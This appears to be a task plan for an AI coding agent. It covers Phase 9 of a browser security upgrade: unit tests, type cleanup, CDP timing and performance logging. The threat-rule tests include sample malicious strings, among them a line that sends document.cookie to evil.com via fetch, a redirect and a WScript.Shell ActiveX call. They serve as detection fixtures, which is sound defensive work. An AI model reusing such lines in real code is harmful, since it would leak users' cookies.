# Phase 9: Test Coverage, Type Cleanup + CDP Timing Fix

> **Priority:** HIGH | **Effort:** ~3-4 hours | **Dependencies:** All phases complete (0-A through Phase 8)

## Goal

Address all gaps identified in the post-implementation review:

1. **Unit tests** for all pure security functions (entropy, AST hash, normalization, similarity, threat rules)
2. **`EventCategory` type extension** — add `'content'` to cover tracker/iframe/mixed-content events
3. **CDP attachment timing fix** — close the monitor injection race condition
4. **ROADMAP.md maintenance** — check off all completed tasks
5. **Performance benchmark** — baseline measurement for the security pipeline

No architectural changes. No new features.

---

## Files to Read

- `docs/security-upgrade/STATUS.md` — context on all previous phases
- `src/security/types.ts` — `EventCategory` union type, `AnalysisConfidence`, `JS_THREAT_RULES`
- `src/security/script-guard.ts` — `calculateEntropy()`, `normalizeScriptSource()`, `computeASTHash()`, `computeSimilarity()`
- `src/security/content-analyzer.ts` — `EventCategory` usage in `logEvent()` calls
- `src/devtools/manager.ts` — how CDP is attached to tabs (to understand timing)
- `src/security/security-manager.ts` — where `setDevToolsManager()` is called (timing of ScriptGuard setup)
- `docs/security-upgrade/ROADMAP.md` — list of all tasks to mark done

---

## Files to Modify

- `src/security/types.ts`
- `src/security/content-analyzer.ts`
- `src/security/behavior-monitor.ts` (if it uses `EventCategory`)
- `src/devtools/manager.ts` — CDP attachment timing
- `src/security/security-manager.ts` — if timing change requires adjustment
- New file: `src/security/tests/security.test.ts`
- `docs/security-upgrade/ROADMAP.md`

---

## Tasks

### 9.1 — ROADMAP.md: Mark all completed tasks

**File:** `docs/security-upgrade/ROADMAP.md`

All 66 tasks across Phases 0-A through Phase 8 have been implemented but the checkboxes in ROADMAP.md were never updated (each phase only updated STATUS.md).

Go through ROADMAP.md and change all `- [ ]` items to `- [x]`. Do NOT change the structure or text — only the checkbox state.

**Note:** Phase 8 tasks are not in ROADMAP.md (it was added as a post-review fix round). Add a section at the bottom of ROADMAP.md:

```markdown
---

## Phase 8: Post-Review Fix Round
**Priority:** HIGH | **Effort:** ~1 hour | **Dependencies:** All phases complete

- [x] **8.1** [CRITICAL] Wire `sendEvent()` in SecurityManager `onEventLogged` callback
- [x] **8.2** [IMPORTANT] Compute `script_hash` from source in `analyzeExternalScript()`
- [x] **8.3** [IMPORTANT] Add `logEvent()` calls for tracker/iframe/mixed-content detections
- [x] **8.4** [IMPORTANT] Remove `@types/acorn` from devDependencies
- [x] **8.5** [IMPORTANT] Relax similarity candidate pool (not just blocked domains)
- [x] **8.6** [MINOR] Filter `debugger://` URLs in ScriptGuard
- [x] **8.7** [MINOR] Add `IPV4_REGEX` scan to `deepScanPageSource()`
- [x] **8.8** [MINOR] Fix WebSocket flag confidence (BEHAVIORAL → HEURISTIC)
- [x] **8.9** [MINOR] Document MIME whitelist Electron API limitation

---

## Progress Summary (Updated after Phase 9)
```

Then update the Progress Summary table at the bottom of ROADMAP.md with Phase 8 and Phase 9 rows.

---

### 9.2 — Extend `EventCategory` type with `'content'`

**File:** `src/security/types.ts`

**Problem:** New events for tracker, iframe, mixed-content, and hidden-blocked-ip use category `'network'`, which is semantically incorrect. These are content-level page analysis results, not network-level decisions.

**Fix:**

```typescript
// BEFORE:
category: 'network' | 'script' | 'form' | 'outbound' | 'behavior';

// AFTER:
category: 'network' | 'script' | 'form' | 'outbound' | 'behavior' | 'content';
```

Then update all affected `logEvent()` calls in `content-analyzer.ts`:
- `hidden-iframe` events: change `category: 'network'` → `category: 'content'`
- `mixed-content` events: change `category: 'network'` → `category: 'content'`
- `trackers-detected` events: change `category: 'network'` → `category: 'content'`
- `hidden-blocked-url` events: change `category: 'network'` → `category: 'content'`
- `octal-ip-evasion` events: change `category: 'network'` → `category: 'content'` (these come from page source, not network)
- `hidden-blocked-ip` events: change `category: 'network'` → `category: 'content'`
- `password-on-http` events: keep `category: 'network'` (this IS a network-level concern)

**After change:** Run `npx tsc --noEmit`. If TypeScript reports errors on other files using `EventCategory`, fix those too.

---

### 9.3 — Fix CDP attachment timing (monitor injection race condition)

**Problem:** ScriptGuard subscribes to `Debugger.scriptParsed` events to track and analyze scripts. CDP is attached after navigation starts, which means scripts that load in the very first moments of a page load (before the CDP `Debugger.enable` command completes) are never seen by ScriptGuard.

**Root cause:** Read `src/devtools/manager.ts` first to understand the exact attachment flow. Read `src/security/security-manager.ts` to understand when ScriptGuard begins its CDP subscriptions.

**Fix approach (adapt to actual code):**

The goal is to ensure that `Debugger.enable` is sent as early as possible — ideally on tab creation / `did-start-navigation` rather than after the first page load completes.

In `src/devtools/manager.ts`:

1. Find the CDP attachment point (likely `webContents.debugger.attach()` and the subsequent `enable()` calls)
2. Move attachment to the **earliest possible hook** — typically `webContents.on('did-start-navigation')` or the tab creation callback, rather than `did-stop-loading` or `dom-ready`
3. Check if `Debugger.enable` is sent in the attachment sequence — it must be sent before any `scriptParsed` events can arrive

**Important constraints:**
- Read the existing code carefully before making changes — DevToolsManager may already use an early hook
- Do NOT change CDP subscriber registration order (StealthManager must remain priority 10)
- The race condition window cannot be fully eliminated (there is always a tiny gap between Electron creating the WebContents and CDP attaching) — the goal is to minimize it to milliseconds, not zero it
- If the fix would require more than ~30 lines of changes to devtools/manager.ts, document the current state and the recommended fix approach instead of implementing it (too risky without testing)
- Test by navigating to a JS-heavy page and checking that ScriptGuard sees scripts in the security event log

---

### 9.4 — Unit tests for pure security functions

**File:** `src/security/tests/security.test.ts` (new file)

Create a vitest test file covering all pure/deterministic functions that were added in this upgrade. These functions have no side effects and don't need the full Electron/CDP stack to run.

**Setup:**
```bash
# Check if vitest is already installed
cat package.json | grep vitest
# If not installed:
npm install --save-dev vitest
```

Add test script to `package.json` if not present:
```json
"test:security": "vitest run src/security/tests/"
```

**Test file structure:**

```typescript
import { describe, it, expect } from 'vitest';

// Import the functions to test
// NOTE: These are module-level functions, not exported.
// Options:
//   A) Add @vitest/coverage-v8 and test via the module
//   B) Export the functions with an @internal marker (preferred — explicit)
//   C) Copy the function implementations into the test file (avoid — duplication)
// Use option B: add `export` to each tested function in the source file.
// This does NOT change the public API — these are security internals anyway.
```

**Functions to export and test:**

In `src/security/script-guard.ts`, add `export` keyword to:
- `calculateEntropy`
- `normalizeScriptSource`
- `computeASTHash` (needs `acorn` import — test can import acorn directly)
- `computeSimilarity`
- `walkAST` (can be left internal)
- `buildNodeFeature` (can be left internal)

In `src/security/types.ts`, `JS_THREAT_RULES` is already exported.

**Test cases to write:**

```typescript
describe('calculateEntropy', () => {
  it('returns ~0 for uniform string', () => {
    expect(calculateEntropy('aaaaaaaaaa')).toBeCloseTo(0, 1);
  });
  it('returns ~3 for simple repeating string', () => {
    expect(calculateEntropy('abababab')).toBeCloseTo(1, 0);
  });
  it('returns high entropy for random-like string', () => {
    const random = 'x3$kP!9mQ@7zR#4nL%6vB&2wF^5hJ*8cD';
    expect(calculateEntropy(random)).toBeGreaterThan(4.5);
  });
  it('returns 0 for empty string', () => {
    expect(calculateEntropy('')).toBe(0);
  });
});

describe('normalizeScriptSource', () => {
  it('strips single-line comments', () => {
    const src = 'var x = 1; // this is a comment\nvar y = 2;';
    expect(normalizeScriptSource(src)).not.toContain('this is a comment');
  });
  it('strips block comments', () => {
    const src = 'var x = /* block comment */ 1;';
    expect(normalizeScriptSource(src)).not.toContain('block comment');
  });
  it('collapses whitespace', () => {
    const src = 'var    x    =    1;';
    expect(normalizeScriptSource(src)).toBe('var x = 1;');
  });
  it('produces same output for semantically equivalent scripts', () => {
    const a = 'var x = 1; // comment A\n  var y  = 2;';
    const b = 'var x = 1;\nvar y = 2;';
    expect(normalizeScriptSource(a)).toBe(normalizeScriptSource(b));
  });
});

describe('computeASTHash', () => {
  it('produces same hash for scripts with different variable names', () => {
    const parse = (src: string) => acorn.parse(src, { ecmaVersion: 'latest', sourceType: 'module' }) as acorn.Node;
    const a = parse('function foo(x) { return x + 1; }');
    const b = parse('function bar(y) { return y + 1; }');
    expect(computeASTHash(a)).toBe(computeASTHash(b));
  });
  it('produces different hash for structurally different scripts', () => {
    const parse = (src: string) => acorn.parse(src, { ecmaVersion: 'latest', sourceType: 'module' }) as acorn.Node;
    const a = parse('function foo(x) { return x + 1; }');
    const b = parse('function bar(y) { return y * 2 + 3; }');
    expect(computeASTHash(a)).not.toBe(computeASTHash(b));
  });
});

describe('computeSimilarity', () => {
  it('returns 1.0 for identical vectors', () => {
    const v = new Map([['a', 2], ['b', 3]]);
    expect(computeSimilarity(v, v)).toBeCloseTo(1.0, 5);
  });
  it('returns 0.0 for orthogonal vectors', () => {
    const v1 = new Map([['a', 1]]);
    const v2 = new Map([['b', 1]]);
    expect(computeSimilarity(v1, v2)).toBeCloseTo(0.0, 5);
  });
  it('returns 0 for empty vectors', () => {
    expect(computeSimilarity(new Map(), new Map())).toBe(0);
  });
  it('returns between 0 and 1 for partial overlap', () => {
    const v1 = new Map([['a', 2], ['b', 1]]);
    const v2 = new Map([['a', 1], ['c', 1]]);
    const sim = computeSimilarity(v1, v2);
    expect(sim).toBeGreaterThan(0);
    expect(sim).toBeLessThan(1);
  });
});

describe('JS_THREAT_RULES', () => {
  it('contains exactly 25 rules', () => {
    expect(JS_THREAT_RULES).toHaveLength(25);
  });
  it('all rules have required fields', () => {
    for (const rule of JS_THREAT_RULES) {
      expect(rule.id).toBeTruthy();
      expect(rule.pattern).toBeInstanceOf(RegExp);
      expect(rule.score).toBeGreaterThan(0);
      expect(rule.severity).toMatch(/low|medium|high|critical/);
      expect(rule.category).toMatch(/obfuscation|exfiltration|injection|redirect|evasion/);
    }
  });
  // Test each critical rule with a true positive
  it('eval_string — matches eval("string")', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'eval_string')!;
    expect(rule.pattern.test('eval("malware()")')).toBe(true);
  });
  it('eval_string — does NOT match eval(variable)', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'eval_string')!;
    expect(rule.pattern.test('eval(someVar)')).toBe(false);
  });
  it('cookie_to_fetch — matches cookie+fetch proximity', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'cookie_to_fetch')!;
    expect(rule.pattern.test('var c = document.cookie; fetch("https://evil.com", {body: c})')).toBe(true);
  });
  it('activex_object — matches ActiveX creation', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'activex_object')!;
    expect(rule.pattern.test('var x = new ActiveXObject("WScript.Shell")')).toBe(true);
  });
  it('silent_catch — matches empty catch block', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'silent_catch')!;
    expect(rule.pattern.test('try { doSomething(); } catch (e) { }')).toBe(true);
  });
  it('silent_catch — does NOT match catch with body', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'silent_catch')!;
    expect(rule.pattern.test('try { x(); } catch (e) { console.error(e); }')).toBe(false);
  });
  it('location_redirect — matches dynamic redirect', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'location_redirect')!;
    expect(rule.pattern.test('window.location.href = "https://evil.com"')).toBe(true);
  });
  it('location_redirect — does NOT match comparison', () => {
    const rule = JS_THREAT_RULES.find(r => r.id === 'location_redirect')!;
    expect(rule.pattern.test('if (window.location.href === "https://example.com")')).toBe(false);
  });
});
```

**Important notes:**
- Keep tests in `src/security/tests/` (not project root)
- Run `npm run test:security` (or `npx vitest run src/security/tests/`) to verify all tests pass
- If any rule tests fail, that reveals a genuine problem in the rule regex — fix the rule, not the test
- Don't test implementation details (exact DB queries, CDP calls) — only pure functions

---

### 9.5 — Performance baseline measurement

**File:** No source changes — this is a measurement + documentation task.

Add a simple performance log to understand the overhead added by this security upgrade.

In `src/security/script-guard.ts`, inside `analyzeExternalScript()`, add timing around the analysis pipeline:

```typescript
// Around the full analysis block in analyzeExternalScript():
const perfStart = performance.now();

// ... all existing analysis (normalize, AST, rules, entropy, similarity) ...

const perfMs = performance.now() - perfStart;
if (perfMs > 50) {
  console.warn(`[ScriptGuard] Slow analysis: ${url} took ${perfMs.toFixed(1)}ms`);
}
```

Similarly in `content-analyzer.ts`, around `deepScanPageSource()`:

```typescript
const scanStart = performance.now();
await this.deepScanPageSource(url, domain, tabId);
const scanMs = performance.now() - scanStart;
if (scanMs > 100) {
  console.warn(`[ContentAnalyzer] Slow deep scan: ${domain} took ${scanMs.toFixed(1)}ms`);
}
```

**Rationale:** This doesn't measure absolute performance but will surface slow-path scenarios (large scripts, complex pages) during real-world use. The 50ms/100ms thresholds are conservative — the goal is to detect outliers, not normal cases.

**Note:** These console.warn calls are intentional — they're operational feedback, not debug artifacts. They only fire for genuinely slow cases.

---

## Verification

After all tasks:
- [ ] `npx tsc --noEmit` — 0 errors (including after `EventCategory` extension)
- [ ] All ROADMAP.md checkboxes are `[x]` (66 tasks + 9 Phase 8 tasks)
- [ ] `EventCategory` union includes `'content'`
- [ ] `hidden-iframe`, `mixed-content`, `trackers-detected`, `hidden-blocked-url`, `octal-ip-evasion`, `hidden-blocked-ip` events use `category: 'content'`
- [ ] `password-on-http` events still use `category: 'network'`
- [ ] CDP attaches earlier (or: change is documented with rationale if too risky)
- [ ] `npm run test:security` passes — all tests green
- [ ] 25 JS_THREAT_RULES test passes
- [ ] `calculateEntropy` tests pass
- [ ] `normalizeScriptSource` tests pass
- [ ] `computeASTHash` tests pass (same hash for different variable names)
- [ ] `computeSimilarity` tests pass
- [ ] Performance logging present in `script-guard.ts` and `content-analyzer.ts`
- [ ] App launches with `npm start`, browsing works
- [ ] All regression endpoints: /security/status, /security/outbound/stats, /security/gatekeeper/status, /security/page/analysis, /security/scripts/correlations, /security/analyzers/status

---

## Scope

- Task 9.3 (CDP timing fix): **if the actual fix requires >30 lines of changes to devtools/manager.ts, stop and document instead** — this is a sensitive area that touches all CDP functionality. A detailed "here's what needs to change and why" is more valuable than a rushed fix.
- Do NOT add new security detection rules or threat heuristics
- Do NOT change the scoring thresholds or confidence levels
- Do NOT modify the GatekeeperWebSocket protocol
- Do NOT change `AnalyzerManager`'s re-entrancy guard logic
- The `export` keywords added to pure functions in task 9.4 do NOT need to be added to the TypeScript public API declaration file (if one exists)

---

## After Completion

1. Update `docs/security-upgrade/STATUS.md` — add Phase 9 section with all verification checkboxes
2. Commit using:
   ```bash
   git commit -m "feat(security): Phase 9 — test coverage, type cleanup + CDP timing fix

   - Unit tests for entropy, normalization, AST hash, similarity, 25 threat rules
   - EventCategory extended with 'content' for page analysis events
   - CDP attachment timing improved (or documented if too risky)
   - ROADMAP.md all tasks marked complete
   - Performance logging for slow analysis paths

   Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>"
   ```
